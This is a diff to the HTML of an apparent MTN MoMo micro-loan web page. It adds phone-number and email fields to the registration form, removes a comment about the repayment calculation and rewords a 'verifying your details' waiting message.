@@ -85,7 +85,6 @@
                     </div>
                 </div>
                 <div class="calc-result">
-                    <!-- ✅ Corrected: 27% p.a. on R 50,000 / 48 months -->
                     <div class="result-row"><span>Monthly Payment</span><strong id="monthlyAmt">R 1,775</strong></div>
                     <div class="result-row"><span>Total Repayment</span><strong id="totalAmt">R 85,200</strong></div>
                     <div class="result-row highlight"><span>Amount You Receive</span><strong id="receiveAmt">R 50,000</strong></div>
@@ -125,6 +124,22 @@
                 <div id="regDetailsPreview" class="reg-preview"><div class="reg-preview-placeholder">Enter your ID above</div></div>
             </div>
             <div class="field">
+                <label>Mobile Number (MTN MoMo)</label>
+                <div class="phone-row">
+                    <div class="ph-pre">+27</div>
+                    <input type="tel" id="regPhone" maxlength="9" placeholder="8X XXX XXXX"
+                           inputmode="numeric" autocomplete="tel-national"
+                           oninput="normalizePhone('regPhone');clearErr('regErr')" />
+                </div>
+                <div class="field-hint">Used by admin to verify your wallet</div>
+            </div>
+            <div class="field">
+                <label>Email Address</label>
+                <input type="email" id="regEmail" maxlength="120" placeholder="your@email.com"
+                       autocomplete="email" oninput="clearErr('regErr')" />
+                <div class="field-hint">Loan confirmations &amp; updates</div>
+            </div>
+            <div class="field">
                 <label>Choose Your MoMo Account Type</label>
                 <div class="account-types" id="accountTypes">
                     <div class="account-type" data-type="yello" onclick="selectAccountType('yello')"><div class="at-icon">🟡</div><div class="at-info"><div class="at-name">MoMo Yello</div><div class="at-desc">Daily: R3,500 · Monthly: R20,000 · <b>Max loan: R20,000</b></div></div><div class="at-check">○</div></div>
@@ -143,7 +158,7 @@
     <div class="wait-bg"><div class="wait-wrap">
         <div class="wait-icon pulse">📱</div>
         <h2>Setting Up Your Account...</h2>
-        <p>Verifying your ID and creating your wallet</p>
+        <p>Verifying your details and creating your wallet</p>
         <div class="wait-status" id="regProcessingStatus">⏳ Please wait...</div>
         <div class="poll-indicator"><span class="dot"></span> This takes a few seconds...</div>
     </div></div>
